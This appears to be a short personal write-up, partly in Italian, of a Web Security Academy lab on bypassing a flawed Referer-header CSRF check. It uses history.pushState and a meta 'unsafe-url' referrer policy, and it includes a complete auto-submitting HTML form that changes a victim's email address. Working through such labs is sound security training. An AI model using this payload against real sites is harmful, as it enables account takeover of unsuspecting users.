here we noticed that the site performs a validation looking if in the referer link we can match the same-site so basically it is a very huge problem because if we have as referer:
 http://malicious.com/?correct_valid_domain.net then the check is ok and the request is performed 


so what we need is to force our request to insert into the referer header correct_valid_domain.net as a query string to bypass the check

this can be done with:
history.pushState("", "", "/?YOUR-LAB-ID.web-security-academy.net")
in pratica la pagina viene caricata e poi modificata in /?YOUR-LAB-ID.web-security-academy.net e questo ci permette di eseguire l'attacco. Serve ? se no si rompe il link, cos'Ã¬ invece referer diventa: https://exploit-0af3002e0490b36a8186248d01f9006a.exploit-server.net/exploit?0a7200b604d6b3c18144253800240081.web-security-academy.net

we put <meta name="referrer" content="unsafe-url"> because if don't use it browsers for security reason will drop the query parameter

so we have


<html>
    <head> 
          <meta name="referrer" content="unsafe-url">
    </head>
    <script> history.pushState("", "", "/?YOUR-LAB-ID.web-security-academy.net") </script>

    <body>
        <form action="https://0af3005e045b71a7825df69a00f500c0.web-security-academy.net/my-account/change-email" method="POST">
            <input type="hidden" name="email" value="exploit@evil-user.net" />
        </form>
    
    
    <script> 
        document.forms[0].submit()
    </script>


    </body>
</html>
